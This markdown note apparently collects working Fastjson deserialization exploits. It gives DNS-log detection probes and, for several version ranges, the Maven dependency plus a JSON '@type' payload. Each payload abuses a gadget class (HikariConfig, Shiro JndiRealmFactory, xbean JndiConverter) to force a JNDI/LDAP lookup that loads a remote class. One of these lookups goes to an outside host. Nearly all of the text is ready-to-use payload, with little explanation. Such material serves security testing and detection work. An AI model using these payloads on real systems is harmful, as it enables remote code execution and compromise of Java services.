## Ref
- http://dream0x01.com/spear-framework/#/fastjson/fastjson
- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce



## fastjson detection
```json
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
```

## poc for all versions

### <= 1.2.68 org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig
pom.xml:
```
        <dependency>
            <groupId>org.apache.hadoop</groupId>
            <artifactId>hadoop-client-minicluster</artifactId>
            <version>3.2.1</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:43658/Calc"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:43658/Calc"}
```

### <= 1.2.66 org.apache.shiro.realm.jndi.JndiRealmFactory
pom.xml:
```
        <!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-core -->
        <dependency>
            <groupId>org.apache.shiro</groupId>
            <artifactId>shiro-core</artifactId>
            <version>1.2.4</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://shiro.5a8a62c8cc78196e6377.d.zhack.ca:43658/Calc"], "Realms":[""]}
```


### <= 1.2.62 org.apache.xbean.propertyeditor.JndiConverter
pom.xml:
```
        <!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-reflect -->
        <dependency>
            <groupId>org.apache.xbean</groupId>
            <artifactId>xbean-reflect</artifactId>
            <version>4.16</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://localhost:1389/Calc"}
```
